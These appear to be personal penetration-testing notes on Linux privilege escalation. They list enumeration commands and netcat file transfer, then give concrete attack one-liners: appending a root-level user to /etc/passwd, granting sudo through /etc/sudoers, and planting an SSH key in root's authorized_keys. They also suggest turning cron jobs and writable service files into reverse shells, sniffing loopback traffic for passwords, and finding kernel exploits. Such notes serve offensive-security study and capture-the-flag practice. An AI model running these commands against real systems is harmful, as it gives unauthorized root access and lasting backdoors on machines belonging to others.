# Enum
- Find all useful files when gained foothold
## Useful Info
- ``` ls -l /etc/shadow ``` see permission of if can see hashed password 
- ```  id ``` check current user uid, gid (primary group) & groups (other groups)
- ``` cat /etc/passwd ``` lists several user accounts
    ```
        1. Login Name: Indicates the username used for login.
        2. Encrypted Password: This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file (more on that shortly).
        3. UID: Aside from the root user that has always a UID of 0, Linux starts counting regular user IDs from 1000. This value is also called real user ID.
        4. GID: Represents the user's specific Group ID.
        5. Comment:  This field generally contains a description about the user, often simply repeating username information.
        6. Home Folder: Describes the user's home directory prompted upon login.
        7. Login Shell: Indicates the default interactive shell, if one exists.
    ```
- ``` hostname``` OS Type + description (not too useful)
  
- ``` cat /etc/issue ``` | ``` cat /etc/os-release ``` | ```uname -a```OS release & version (better OS Enum)
- ``` ps aux``` show all process 
- ``` ip a ``` list all network card & info in this machine
- ``` route ``` | ``` routel ``` show network routing tables (easy fuck itself localhost services to priv esc)
- ``` ss -anp ``` list all connection
- ``` cat /etc/iptables/rules.v4 ``` need root to see iptables (firewall rules)
- ``` sudo lsof -i -P -n | grep LISTEN ``` show exposed ports 

- ``` ls -lah /etc/cron* ``` list all cron jobs with files and directories 
- ``` crontab -l ``` list the cronjob that current user run | for ``` sudo crontab -l ``` can see jobs run by root
- ``` dpkg -l | rpm ``` list all package 
    ``` 
        Debian-based (Debian, Ubuntu, etc.): dpkg, apt, aptitude
        Red Hat-based (Red Hat Enterprise Linux, CentOS, Fedora, etc.): rpm, yum, dnf
        SUSE-based (openSUSE, SUSE Linux Enterprise, etc.): rpm, zypper
        Arch Linux-based (Arch Linux, Manjaro, etc.): pacman
        Gentoo-based: emerge, Portage
        Slackware-based: pkgtool, slackpkg
        FreeBSD: pkg, FreeBSD Ports
        OpenBSD: pkg_add, OpenBSD Ports
    ```
- ``` find / -writable -type d 2>/dev/null ``` find all writable file of current user
- ``` mount ``` check all mounted filesystems
- ``` cat /etc/fstab ``` check all drives in boot time
- ``` lsblk ``` list all available disk
- ``` lsmod ``` list all drivers installed
- ``` /sbin/modinfo {driver_name} ``` get detail or certain drivers
- ``` find / -perm -u=s -type f 2>/dev/null ``` find all SUID/SGID marked file for ez impersonate permission for everyone
- Can Use ``` strings ``` to read binaries details under ``` /usr/bin ```
- given binary to be executed with root permissions even when launched by a lower-privileged user is called the effective UID (EUID)

## Auto Enum
- file transfer from kali to remote 
   1. remote ``` nc -nlvp 3333 > unix-privesc-check ```
   2. kali ``` nc -nv 192.168.158.214 3333 < unix-privesc-check ```
   3. ``` chmod +x {file_name} ```
- ``` unix-privesc-check standard > output.txt ``` & ignore error
- looks for sussy shit e.g. global writable thing

# Exposed Confidential info
## Backup files 
- check linpeas result
- e.g. /opt/backups /etc/backups ,etc...
- Some files will have credentials can directly use e.g. /etc/passwd  ssh-key rsa

## User trails
- ``` env ``` environ variable
- ``` .bashrc ``` bash config file (this file is fucking hidden on99)
- ``` sudo -l``` list sudoer capabilities to user
- ``` find / -name flag.txt 2>/dev/null ``` find flag.txt in linux

## Service footprints
- ``` watch -n 1 "ps -aux | grep pass" ``` process
- ``` sudo tcpdump -i lo -A | grep "pass" ``` tcp traffic
- ``` pspy ``` but dunno how use yet

# Bad File permissions 
## Cron jobss hack
- ``` grep "CRON" /var/log/syslog ``` grep from syslog (messages from various system services and daemons, including the cron daemon)
- change the file to rev shell , ez
## Password authN hack
- unless AD/LDAP, its store in /etc/shadow, write to passwd still works sometimes
- gen 'crypt' hash password ``` openssl passwd {password_plain} ```
- mock user to passwd ``` echo "root2:{password_hashed}:0:0:root:/root:/bin/bash" >> /etc/passwd ```

# Fuck Linux system componenets
### Possible exploit
- GTFO: https://gtfobins.github.io/ 
- SBin: reboot/shutdown(harder caz u have know how to restart): https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/ 
    1. editing writable service ``` find / -writable -name "*.service" 2>/dev/null ``` and impersonate root when restarted
    2. OR directly write rev shell in the command and when restart will auto connect to our nc-lvnp

## Setuid binaries and others
- GTFO: SetUID
- ``` /usr/sbin/getcap -r / 2>/dev/null ``` search misconfigured capabilities e.g. will find perl, ping , or even other binary
- see have ``` cap_setuid+ep```
- go gtfobins look for Capabilities 
- find harder (lookup all bins & PwnKits!!)
### Write to system files for misconfigure Bins
- Example: dosbox w/ SUID
1. /etc/sudoers: ``` echo {current_user_id} ALL=(ALL:ALL) ALL >> /etc/sudoers ```
2. /etc/passwd: ``` echo root2:{}:0:0:root:/root:/bin/bash >> /etc/passwd ``` (generated by ```openssl passwd {password}``` )
3. /root/.ssh/authorized_keys: ``` echo ssh-rsa AAAAB3Nza.... >> /root/.ssh/authorized_keys ``` (generated by ssh-keygen)

### Logic behind
- check if the process is being used by root but normal user trigger ``` ps u -C passwd ```
- e.g ``` passwd ``` will have 1000 0 0 0 = SUID is there | normally all value point to same user
- ``` ls -asl /usr/bin/passwd ``` check permission if have SUID Flag

## Fuck sudo itself
- GTFO: Sudo
- list all current user can use sudo to run 
- brute force those capabilities to PE
- if not success -> check error ``` cat /var/log/syslog | grep {binary_name} ```
- sometimes blocked by apparmor

## Kernal fuck
- search public exploit | sometime need pull file to victim compile and run
- ``` file {binary}``` can see ELF file architecture
- useful search: ``` searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8" ```

